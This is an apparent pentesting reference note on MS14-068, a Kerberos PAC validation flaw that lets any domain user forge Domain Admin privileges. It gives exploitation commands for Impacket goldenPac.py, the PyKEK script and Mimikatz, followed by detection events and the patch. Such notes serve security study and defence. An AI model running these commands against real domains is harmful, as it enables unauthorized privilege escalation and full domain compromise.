# MS14-068 (CVE-2014-6324)

> [!summary] One-liner
> A critical Kerberos PAC validation bug that lets any authenticated domain user forge a [[PAC]] with Domain Admin privileges — instant domain compromise from a standard user account.

## Concept abused
The [[KDC]] is supposed to validate the [[PAC]] (Privilege Attribute Certificate) signature in Kerberos tickets using a **keyed checksum** (HMAC). Due to a bug, the KDC accepted PACs signed with **unkeyed checksums** (e.g., MD5) — checksums that any user can compute without knowing the KDC's secret key. An attacker could therefore craft a PAC claiming membership in Domain Admins and have the KDC accept it.

## Prerequisites
- Any **authenticated domain user** (standard privileges).
- The user's password/hash and SID.
- Target DC **unpatched** (patch: November 2014 — very old, but still found in neglected environments).

## Commands & tools

### Impacket (goldenPac.py)
```bash
# Exploits MS14-068 + PsExec for instant DA shell
goldenPac.py <DOMAIN>/<USER>:<PASS>@<DC_FQDN>

# With hash instead of password
goldenPac.py -hashes :<NT_HASH> <DOMAIN>/<USER>@<DC_FQDN>
```

### PyKEK (original PoC)
```bash
# Generate a forged TGT with DA PAC
python ms14-068.py -u <USER>@<DOMAIN> -p <PASS> -s <USER_SID> -d <DC_FQDN>

# Import the ticket (Linux)
export KRB5CCNAME=<OUTPUT.ccache>

# Import the ticket (Windows — convert to .kirbi)
mimikatz # kerberos::ptc <TICKET.ccache>
```

### Mimikatz
```
# Exploit directly
kerberos::ms14068 /user:<USER> /password:<PASS> /sid:<USER_SID> /domain:<DOMAIN> /ptt
```

## Detection / artifacts
- **Event 4769** (TGS request): Service ticket requested with anomalous PAC content.
- The forged ticket's PAC contains group membership the user doesn't actually have — compare with actual group membership in AD.
- Unusual checksum types in Kerberos tickets (MD5 instead of HMAC-MD5).

## Mitigation
- **Patch**: KB3011780 (November 2014) — fixes PAC signature validation.
- Extremely old vulnerability — if unpatched, the environment has far larger problems.
- Defense-in-depth: [[Protected Users Group]] prevents NTLM and forces Kerberos with additional protections.
